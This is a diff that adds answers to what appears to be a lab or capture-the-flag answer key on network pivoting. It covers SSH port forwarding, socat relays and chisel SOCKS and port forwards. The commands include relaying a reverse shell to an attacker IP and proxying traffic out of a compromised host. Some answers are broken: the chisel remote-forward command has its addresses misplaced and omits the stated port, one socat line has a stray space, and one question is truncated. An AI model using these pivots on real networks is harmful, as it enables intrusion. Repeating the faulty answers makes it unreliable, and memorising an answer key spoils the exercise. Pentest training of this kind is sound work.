@@ -54,3 +54,34 @@ FP
 
 #### If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.
 ssh -L 8000:127.0.0.1:80 user@172.16.0.50
+
+
+### plink.exe
+#### What tool can be used to convert OpenSSH keys into PuTTY style keys?
+ puttygen
+
+### Socat
+####  Which socat option allows you to reuse the same listening port for more than one connection?
+reuseaddr
+
+### If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory? Use TCP port 8000 for the server listener, and do not background the process.
+  ./socat tcp-l:8000 tcp:172.16.0.200:443
+
+#### What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?
+./socat tcp-l:2222, fork,reuseaddr tcp:172.16.0.100:22 &
+
+### Chisel
+
+#### Use port 4242 for the listener and do not background the process.
+./chisel server -p 4242 --reverse
+
+#### What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?
+./chisel client 172.16.0.200:4242 socks
+
+#### How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.
+./chisel client 172.16.0.100:3306 R:33060:172.16.0.200 &
+
+#### If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
+./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
+
+### Sshuttle
